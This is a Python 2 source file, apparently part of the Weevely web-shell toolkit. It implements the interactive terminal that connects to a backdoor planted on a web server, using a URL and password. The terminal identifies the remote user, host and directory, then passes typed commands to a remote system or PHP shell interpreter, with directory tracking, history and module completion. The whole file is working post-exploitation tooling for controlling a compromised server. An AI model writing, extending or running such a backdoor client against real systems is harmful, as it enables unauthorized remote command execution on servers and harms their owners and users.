'''
Created on 22/ago/2011

@author: norby
'''

from core.module import ModuleException
import readline, atexit, os, re, shlex

class Terminal():
    
    def __init__( self, modhandler, one_shot = False):

        self.modhandler = modhandler
        
        self.url = modhandler.url
        self.password = modhandler.password
        self.interpreter = None
        self.cwd_interpreter = None
        self.module_char = ':'
        self.help_string = ':help'
        self.one_shot = one_shot
        self.completions = {}
    
        self.__load_interpreters()
    
        self.cwd_extract = re.compile( "cd\s+(.+)", re.DOTALL )

        self.username = self.run_module('system.info', [ "whoami" ])
        self.hostname = self.run_module('system.info', [ "hostname" ])
        self.cwd = self.run_module('system.info', [ "basedir" ])
    
        if not one_shot:
            
            self.history      = os.path.expanduser( '~/.weevely_history' )

            try:
                
                readline.parse_and_bind( 'tab: menu-complete' )
                readline.set_completer( self.__complete )
                readline.read_history_file( self.history )
                
            except IOError:
                pass
    
            atexit.register( readline.write_history_file, self.history )


    def __load_interpreters(self):
        
        try:
            self.modhandler.load('shell.sh')
        except ModuleException, e:
            print '[!] [shell.sh] Error loading module: %s' % (e)
            
            try:
                self.modhandler.load('shell.php')
            except ModuleException, e:
                print '[!] [shell.sh] Error loading module: %s' % (e)
                print '[!] No backdoor found. Check url and password'
                
            else:
                self.interpreter = 'shell.php'
                print '[+] Fallback to PHP interpreter \'%s\', end commands with semi-colon.' % self.interpreter
                if not self.one_shot:
                    print '[+] Substitute of \'cd [path]\' and \'ls [path]\' are available'
                self.prompt        = "%s@%s:%s php> "
                
                if self.modhandler.load('shell.php').cwd_handler('.'):
                    self.cwd_interpreter = 'shell.php'
            
        else:
            self.interpreter = 'shell.sh'
            self.prompt = "%s@%s:%s$ "
            print '[+] Using system shell interpreter \'%s\'' % self.interpreter
            
            if self.modhandler.load('shell.sh').cwd_handler('.'):
                self.cwd_interpreter = 'shell.sh'


    def loop(self):
        
        while self.interpreter:
            
            prompt        = self.prompt % (self.username, self.hostname, self.cwd)

                
            cmd       = raw_input( prompt )
            cmd       = cmd.strip()
            
            if cmd:
                self.run_single(cmd)
            
    def run_single(self, cmd):
    
        if not self.interpreter:
            return
             
        output = ''
    
        ## Module call
        if cmd[0] == self.module_char:
            
            cmd_split = shlex.split(cmd)
            
            ## Help call
            if cmd_split[0] == self.help_string:
            
                self.modhandler.print_module_infos()
                
            else:
            
                cmd_split[0] = cmd_split[0][1:]
                
                if len(cmd_split)==1:
                    output = self.run_module(cmd_split[0], [])
                elif len(cmd_split)==2:
                    output =  self.run_module(cmd_split[0], [ cmd_split[1] ])
                elif len(cmd_split)>2:
                    output =  self.run_module(cmd_split[0], cmd_split[1:])
                else:
                    print '[!] Error specify module name'
                    
        # Default interpreter call
        elif cmd[0] != self.module_char:
        
            if not self.one_shot:
                if self.__handleDirectoryChange(cmd,self.cwd_interpreter) == False:
                    if self.interpreter == 'shell.php' and cmd.startswith('ls'):
                        print self.modhandler.load('shell.php').ls_handler(cmd)
               
                    output = self.run_module(self.interpreter, [ cmd ])  
                    
                else:
                    pass
                
            else:
                output = self.run_module(self.interpreter, [ cmd ])  
            
        if output:
            print output
    


    def __handleDirectoryChange( self, cmd, interpreter ):
        cd  = self.cwd_extract.findall(cmd)
        
        if cd != None and len(cd) > 0:    
            cwd  = cd[0].strip()
            path = self.cwd
            if cwd[0] == '/':
                path = cwd
            elif cwd == '..':
                dirs = path.split('/')
                dirs.pop()
                path = '/' + '/'.join(dirs)[1:]
            elif cwd == '.':
                pass
            elif cwd[0:3] == '../':
                path = cwd.replace( '../', path )
            elif cwd[0:2] == './':
                path = cwd.replace( './', path )
            else:
                path = (path + "/" + cwd).replace( '//', '/' ) 
            
            if self.modhandler.load(self.cwd_interpreter).cwd_handler(path,True):
                self.cwd = path
                    
            else:
                print "[!] Directory '%s' does not exist or is not accessible." % path

            return True

        return False

    def __complete( self, text, state ):
        
        try:
            matches = self.completions[text]
        except KeyError:

            matches = []
            for module_name in ([ ':' + x for x in self.modhandler.module_info.keys() ] + [ ':help' ]):
                
                if module_name.startswith(text):
                    matches.append(module_name)
                    
            self.completions[text] = matches
            
        try:
            return matches[state]
        except IndexError:
            return None


    def run_module(self, module_name, module_arguments):
        
        if module_name not in self.modhandler.module_info.keys():
            print '[!] Error module with name \'%s\' not found' % (module_name)
        else:
            try:
                module_arguments_requested = self.modhandler.load(module_name).len_arguments
            except ModuleException, e:
                print '[!] [%s] Error while loading: %s' % (e.module, e)   
            
            else: 
                if module_arguments_requested != len(module_arguments): 
                    print '[!] [%s] Error module needs %i arguments (not %i)\n' % (module_name, module_arguments_requested, len(module_arguments))
                    if self.modhandler.module_info[module_name][0]: print '%s: %s' % (module_name, self.modhandler.module_info[module_name][1])
                
                else:
                    try:
                        return self.modhandler.load(module_name).run(*module_arguments)
                    except ModuleException, e:
                        print '[!] [%s] Error: %s' % (e.module, e) 
        
      
    